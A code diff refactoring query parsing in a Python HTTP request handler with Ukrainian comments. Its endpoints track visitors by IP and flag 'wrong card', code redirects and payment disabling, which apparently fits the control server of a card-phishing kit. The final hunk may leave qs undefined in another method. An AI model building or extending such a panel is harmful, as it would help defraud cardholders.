@@ -172,6 +172,9 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     @log_function
     def do_GET(self):
+        qs = {}
+        if '?' in self.path:
+            qs = parse_qs(self.path.split('?', 1)[1])
         # --- Блокування IP ---
         if self.is_blocked():
             self.send_response(403)
@@ -290,8 +293,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 )
         # --- Додаємо обробку /check_request_again ---
         if self.path.startswith('/check_request_again'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             code = qs.get('code', [None])[0]
             print(f"[check_request_again][GET] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
             if code and REQUEST_AGAIN_FLAGS.get(code):
@@ -307,8 +308,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
         # --- Wrong card polling ---
         if self.path.startswith('/check_wrong_card'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             if ip and WRONG_CARD_FLAGS.get(ip):
                 WRONG_CARD_FLAGS[ip] = False
@@ -321,8 +320,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.wfile.write(b'false')
             return
         if self.path.startswith('/check_code_redirect'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             if ip and CODE_REDIRECT_FLAGS.get(ip):
                 CODE_REDIRECT_FLAGS[ip] = False
@@ -335,8 +332,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.wfile.write(b'false')
             return
         if self.path.startswith('/get_custom_text'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             text_id = qs.get('text_id', [None])[0]
             text = CUSTOM_TEXTS.get(text_id, '')
             self.send_response(200)
@@ -345,8 +340,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps({'text': text}).encode('utf-8'))
             return
         if self.path.startswith('/check_support'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             flag = SUPPORT_FLAGS.get(ip, {}) if ip else {}
             print(f"[check_support] IP: {ip}, flags: {flag}")
@@ -362,8 +355,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps(response_data).encode('utf-8'))
             return
         if self.path.startswith('/reset_support_flag'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             if ip and ip in SUPPORT_FLAGS:
                 del SUPPORT_FLAGS[ip]
@@ -399,8 +390,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # --- Endpoint для зміни флагу (GET/POST) ---
         if self.path.startswith('/set_payment_disabled'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             val = qs.get('value', [None])[0]
             global PAYMENT_DISABLED
             if val == '1':
@@ -608,8 +597,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.wfile.write(b'error')
             return
         elif path.startswith('/check_request_again'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             code = qs.get('code', [None])[0]
             print(f"[check_request_again] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
             if code and REQUEST_AGAIN_FLAGS.get(code):
